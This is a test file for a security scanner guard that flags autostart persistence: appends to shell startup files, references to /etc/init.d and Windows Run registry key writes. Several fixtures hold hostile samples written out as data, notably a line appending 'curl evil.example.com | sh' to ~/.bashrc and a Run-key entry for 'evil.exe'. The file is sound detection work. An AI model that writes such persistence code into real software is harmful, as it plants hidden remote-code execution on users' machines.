"""Tests for the autostart-persistence-mechanism guard."""
from __future__ import annotations

from agentsec.guards.autostart_persistence_mechanism import AutostartPersistenceMechanismGuard
from tests.guards._common import *  # noqa: F401,F403


def test_fires_on_bashrc_write(tmp_path: Path) -> None:
    (tmp_path / "t.py").write_text(
        "import os\n"
        "def install():\n"
        "    path = os.path.expanduser('~/.bashrc')\n"
        "    with open(path, 'a') as f:\n"
        "        f.write('curl evil.example.com | sh\\n')\n",
        encoding="utf-8",
    )
    findings = AutostartPersistenceMechanismGuard().run(tmp_path, _pyprof(tmp_path))
    assert any(f.rule == "autostart-persistence-mechanism/shell-config-write" for f in findings)


def test_fires_on_js_profile_write(tmp_path: Path) -> None:
    (tmp_path / "t.js").write_text(
        "const fs = require('fs');\n"
        "fs.appendFile('/home/user/.profile', 'evil line', () => {});\n",
        encoding="utf-8",
    )
    findings = AutostartPersistenceMechanismGuard().run(tmp_path, mkprofile(tmp_path, features={"javascript"}))
    assert any(f.rule == "autostart-persistence-mechanism/shell-config-write" for f in findings)


def test_fires_on_system_wide_path_reference_alone(tmp_path: Path) -> None:
    (tmp_path / "t.py").write_text(
        "def install():\n"
        "    target = '/etc/init.d/myservice'\n"
        "    return target\n",
        encoding="utf-8",
    )
    findings = AutostartPersistenceMechanismGuard().run(tmp_path, _pyprof(tmp_path))
    assert any(f.rule == "autostart-persistence-mechanism/system-wide-startup-reference" for f in findings)


def test_fires_on_windows_run_key_write(tmp_path: Path) -> None:
    (tmp_path / "t.py").write_text(
        "import winreg\n"
        "def persist():\n"
        "    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run')\n"
        "    winreg.SetValueEx(key, 'evil', 0, winreg.REG_SZ, 'evil.exe')\n",
        encoding="utf-8",
    )
    findings = AutostartPersistenceMechanismGuard().run(tmp_path, _pyprof(tmp_path))
    assert any(f.rule == "autostart-persistence-mechanism/windows-run-key-write" for f in findings)


def test_passes_bashrc_read_only(tmp_path: Path) -> None:
    (tmp_path / "t.py").write_text(
        "import os\n"
        "def check_completion_installed():\n"
        "    path = os.path.expanduser('~/.bashrc')\n"
        "    with open(path, 'r') as f:\n"
        "        return 'myapp-completion' in f.read()\n",
        encoding="utf-8",
    )
    assert AutostartPersistenceMechanismGuard().run(tmp_path, _pyprof(tmp_path)) == []


def test_pragma_suppresses_whole_file(tmp_path: Path) -> None:
    (tmp_path / "t.py").write_text(
        "# security: allow-autostart-persistence-mechanism\n"
        "import os\n"
        "def install():\n"
        "    path = os.path.expanduser('~/.bashrc')\n"
        "    with open(path, 'a') as f:\n"
        "        f.write('evil\\n')\n",
        encoding="utf-8",
    )
    assert AutostartPersistenceMechanismGuard().run(tmp_path, _pyprof(tmp_path)) == []


def test_does_not_apply_with_no_relevant_stack(tmp_path: Path) -> None:
    prof = mkprofile(tmp_path, features=set())
    assert AutostartPersistenceMechanismGuard().applies(prof) is False


def test_fires_on_one_line_open_of_expanduser_bashrc_for_append(tmp_path: Path) -> None:
    # The canonical one-liner: the nested `expanduser(...)` call used to end the open(...)
    # argument scan at its own `)`, so the mode was never seen.
    (tmp_path / "t.py").write_text(
        "import os\n"
        "def install():\n"
        "    with open(os.path.expanduser('~/.bashrc'), 'a') as f:\n"
        "        f.write('curl evil.example.com | sh\\n')\n",
        encoding="utf-8",
    )
    findings = AutostartPersistenceMechanismGuard().run(tmp_path, _pyprof(tmp_path))
    assert [f.rule for f in findings] == ["autostart-persistence-mechanism/shell-config-write"]
    assert findings[0].location.endswith("t.py:3")


def test_passes_one_line_open_of_expanduser_bashrc_for_reading(tmp_path: Path) -> None:
    # Reading the file (a completion installer checking what is already there) is ordinary.
    (tmp_path / "t.py").write_text(
        "import os\n"
        "def installed():\n"
        "    with open(os.path.expanduser('~/.bashrc'), 'r') as f:\n"
        "        return 'mytool' in f.read()\n"
        "def installed_default_mode(home):\n"
        "    return 'mytool' in open(os.path.join(home, '.zshrc')).read()\n",
        encoding="utf-8",
    )
    assert AutostartPersistenceMechanismGuard().run(tmp_path, _pyprof(tmp_path)) == []
